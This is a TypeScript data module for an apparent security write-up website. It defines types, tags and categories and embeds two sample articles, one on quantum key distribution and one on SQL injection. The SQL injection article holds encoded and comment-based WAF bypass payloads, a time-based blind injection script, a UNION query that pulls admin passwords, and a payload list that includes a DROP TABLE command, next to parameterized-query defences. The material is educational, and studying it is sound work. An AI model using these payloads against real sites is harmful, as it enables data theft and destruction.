// WriteUp 數據類型定義
export interface WriteUpTag {
  name: string
  color: string
}

export interface WriteUpAuthor {
  name: string
  avatar?: string
  bio?: string
  social?: {
    github?: string
    twitter?: string
    linkedin?: string
  }
}

export interface WriteUpMetrics {
  views: string
  likes: string
  shares?: string
  comments?: string
}

export interface WriteUpContent {
  summary: string
  tableOfContents?: string[]
  content: string
  codeExamples?: {
    language: string
    code: string
    description?: string
  }[]
  references?: {
    title: string
    url: string
    type: "article" | "documentation" | "video" | "book"
  }[]
}

export interface WriteUp {
  id: string
  title: string
  slug: string
  category: string
  difficulty: "Beginner" | "Intermediate" | "Advanced" | "Expert" | "Master"
  status: "Published" | "Draft" | "Updated" | "Featured"
  publishedDate: string
  lastUpdated?: string
  description: string
  tags: WriteUpTag[]
  readTime: string
  metrics: WriteUpMetrics
  author: WriteUpAuthor
  content: WriteUpContent
  featured?: boolean
  series?: {
    name: string
    part: number
    totalParts: number
  }
  prerequisites?: string[]
  relatedWriteups?: string[]
}

// 標籤顏色配置
export const TAG_COLORS: { [key: string]: string } = {
  "SQL Injection": "#e74c3c",
  "WAF Bypass": "#f39c12",
  "Web Security": "#e67e22",
  "Penetration Testing": "#c0392b",
  Quantum: "#9b59b6",
  Cryptography: "#3498db",
  QKD: "#2980b9",
  "Post-Quantum": "#8e44ad",
  AI: "#1abc9c",
  Malware: "#34495e",
  "Deep Learning": "#16a085",
  Automation: "#27ae60",
  "Zero-Day": "#d35400",
  Exploit: "#e74c3c",
  "Vulnerability Research": "#c0392b",
  "Reverse Engineering": "#7f8c8d",
  Blockchain: "#f1c40f",
  "Smart Contracts": "#f39c12",
  "Security Audit": "#e67e22",
  Solidity: "#d68910",
  "Memory Corruption": "#2c3e50",
  ROP: "#34495e",
  "Binary Exploitation": "#7f8c8d",
  Pwn: "#95a5a6",
}

// 分類配置
export const CATEGORIES = [
  "All",
  "Web Security",
  "Cryptography",
  "Malware Analysis",
  "Exploit Development",
  "Blockchain Security",
  "Binary Exploitation",
  "AI/ML Security",
  "Mobile Security",
  "Cloud Security",
  "IoT Security",
  "Forensics",
] as const

// 難度配置
export const DIFFICULTIES = ["All", "Beginner", "Intermediate", "Advanced", "Expert", "Master"] as const

// WriteUps 數據庫
export const WRITEUPS_DATABASE: WriteUp[] = [
  {
    id: "advanced-sql-injection-2024",
    title: "Advanced SQL Injection in Modern Web Applications",
    slug: "advanced-sql-injection",
    category: "Web Security",
    difficulty: "Expert",
    status: "Featured",
    publishedDate: "2024-01-15",
    lastUpdated: "2024-01-20",
    description:
      "深入分析現代 Web 應用程式中的高級 SQL 注入技術，包括 WAF 繞過、盲注技巧和自動化工具開發。探討最新的防護機制和攻擊向量，並提供實戰案例分析。",
    tags: [
      { name: "SQL Injection", color: TAG_COLORS["SQL Injection"] },
      { name: "WAF Bypass", color: TAG_COLORS["WAF Bypass"] },
      { name: "Web Security", color: TAG_COLORS["Web Security"] },
      { name: "Penetration Testing", color: TAG_COLORS["Penetration Testing"] },
    ],
    readTime: "15 min",
    metrics: {
      views: "12.5K",
      likes: "892",
      shares: "156",
      comments: "43",
    },
    author: {
      name: "Syan",
      bio: "Red Team Exercise & Developer",
      social: {
        github: "https://github.com/syan-quantum",
        twitter: "https://twitter.com/syan_quantum",
      },
    },
    content: {
      summary: "本文深入探討現代 Web 應用程式中的高級 SQL 注入技術，涵蓋 WAF 繞過、盲注技巧和自動化工具開發。",
      tableOfContents: ["現代 WAF 繞過技術", "盲注自動化技術", "防護機制分析", "實戰案例研究", "工具開發指南"],
      content: `
# Advanced SQL Injection in Modern Web Applications

## 摘要

本文深入探討現代 Web 應用程式中的高級 SQL 注入技術，包括 WAF 繞過、盲注技巧和自動化工具開發。

## 1. 現代 WAF 繞過技術

### 1.1 編碼繞過
\`\`\`sql
-- URL 編碼繞過
%27%20UNION%20SELECT%20*%20FROM%20users--

-- 雙重編碼
%2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--

-- Unicode 編碼
\\u0027\\u0020UNION\\u0020SELECT\\u0020*\\u0020FROM\\u0020users--
\`\`\`

### 1.2 註釋繞過
\`\`\`sql
-- MySQL 註釋繞過
/*!50000UNION*/ /*!50000SELECT*/ * FROM users

-- 內聯註釋
/*! UNION */ /*! SELECT */ * FROM users

-- 版本特定註釋
/*!50001 AND 1=1*/
\`\`\`

## 2. 盲注自動化技術

### 2.1 時間盲注
\`\`\`python
import requests
import time

def time_based_sqli(url, payload):
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()
    
    return (end_time - start_time) > 5

# 測試 payload
payload = "' AND IF(1=1, SLEEP(5), 0)--"
if time_based_sqli(target_url, payload):
    print("SQL Injection 漏洞確認")
\`\`\`

## 3. 防護機制

### 3.1 參數化查詢
\`\`\`python
# 正確的參數化查詢
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# 錯誤的字符串拼接
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
\`\`\`

## 4. 總結

現代 SQL 注入攻擊變得越來越複雜，需要多層防護策略。
      `,
      codeExamples: [
        {
          language: "sql",
          code: "SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admin_users--",
          description: "基本 UNION 注入示例",
        },
        {
          language: "python",
          code: `
import requests

def test_sql_injection(url, param):
    payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
    for payload in payloads:
        response = requests.get(f"{url}?{param}={payload}")
        if "error" in response.text.lower():
            return True
    return False
          `,
          description: "自動化 SQL 注入檢測腳本",
        },
      ],
      references: [
        {
          title: "OWASP SQL Injection Prevention Cheat Sheet",
          url: "https://owasp.org/www-community/attacks/SQL_Injection",
          type: "documentation",
        },
        {
          title: "Advanced SQL Injection Techniques",
          url: "https://example.com/advanced-sqli",
          type: "article",
        },
      ],
    },
    featured: true,
    prerequisites: ["基礎 SQL 知識", "Web 應用程式架構", "HTTP 協議"],
    relatedWriteups: ["quantum-cryptography-implementation", "ai-powered-malware-analysis"],
  },
  {
    id: "quantum-cryptography-implementation-2024",
    title: "Quantum Cryptography Implementation",
    slug: "quantum-cryptography-implementation",
    category: "Cryptography",
    difficulty: "Master",
    status: "Published",
    publishedDate: "2024-01-10",
    description: "實現量子密碼學協議，探討量子金鑰分發和後量子密碼學的實際應用。包含完整的代碼實現和安全性分析。",
    tags: [
      { name: "Quantum", color: TAG_COLORS["Quantum"] },
      { name: "Cryptography", color: TAG_COLORS["Cryptography"] },
      { name: "QKD", color: TAG_COLORS["QKD"] },
      { name: "Post-Quantum", color: TAG_COLORS["Post-Quantum"] },
    ],
    readTime: "25 min",
    metrics: {
      views: "8.7K",
      likes: "654",
      shares: "89",
      comments: "27",
    },
    author: {
      name: "Syan",
      bio: "Red Team Exercise & Developer",
    },
    content: {
      summary: "本文詳細介紹量子密碼學的實現，包括量子金鑰分發（QKD）協議和後量子密碼學算法。",
      content: `
# Quantum Cryptography Implementation

## 摘要

本文詳細介紹量子密碼學的實現，包括量子金鑰分發（QKD）協議和後量子密碼學算法。

## 1. 量子金鑰分發基礎

### 1.1 BB84 協議實現
\`\`\`python
import numpy as np
import random

class BB84Protocol:
    def __init__(self):
        self.bases = ['+', 'x']  # 直線和對角線基
        self.bits = [0, 1]
        
    def generate_random_bits(self, n):
        return [random.choice(self.bits) for _ in range(n)]
    
    def generate_random_bases(self, n):
        return [random.choice(self.bases) for _ in range(n)]
\`\`\`

## 2. 後量子密碼學

### 2.1 格基密碼學
量子計算對傳統密碼學構成威脅，後量子密碼學提供解決方案。

## 3. 實際應用

量子密碼學在金融、政府和軍事領域有重要應用。
      `,
    },
    series: {
      name: "量子安全系列",
      part: 1,
      totalParts: 3,
    },
  },
]

// 工具函數
export function getWriteUpBySlug(slug: string): WriteUp | undefined {
  return WRITEUPS_DATABASE.find((writeup) => writeup.slug === slug)
}

export function getWriteUpsByCategory(category: string): WriteUp[] {
  if (category === "All") return WRITEUPS_DATABASE
  return WRITEUPS_DATABASE.filter((writeup) => writeup.category === category)
}

export function getWriteUpsByDifficulty(difficulty: string): WriteUp[] {
  if (difficulty === "All") return WRITEUPS_DATABASE
  return WRITEUPS_DATABASE.filter((writeup) => writeup.difficulty === difficulty)
}

export function getFeaturedWriteUps(): WriteUp[] {
  return WRITEUPS_DATABASE.filter((writeup) => writeup.featured)
}

export function getRelatedWriteUps(writeupId: string): WriteUp[] {
  const writeup = WRITEUPS_DATABASE.find((w) => w.id === writeupId)
  if (!writeup?.relatedWriteups) return []

  return WRITEUPS_DATABASE.filter((w) => writeup.relatedWriteups?.includes(w.slug))
}

export function searchWriteUps(query: string): WriteUp[] {
  const lowercaseQuery = query.toLowerCase()
  return WRITEUPS_DATABASE.filter(
    (writeup) =>
      writeup.title.toLowerCase().includes(lowercaseQuery) ||
      writeup.description.toLowerCase().includes(lowercaseQuery) ||
      writeup.tags.some((tag) => tag.name.toLowerCase().includes(lowercaseQuery)) ||
      writeup.category.toLowerCase().includes(lowercaseQuery),
  )
}

export function getWriteUpStats() {
  return {
    total: WRITEUPS_DATABASE.length,
    categories: [...new Set(WRITEUPS_DATABASE.map((w) => w.category))].length,
    totalViews: WRITEUPS_DATABASE.reduce((sum, w) => {
      const views = Number.parseFloat(w.metrics.views.replace("K", "")) * 1000
      return sum + views
    }, 0),
    totalLikes: WRITEUPS_DATABASE.reduce((sum, w) => {
      const likes = Number.parseInt(w.metrics.likes)
      return sum + likes
    }, 0),
  }
}
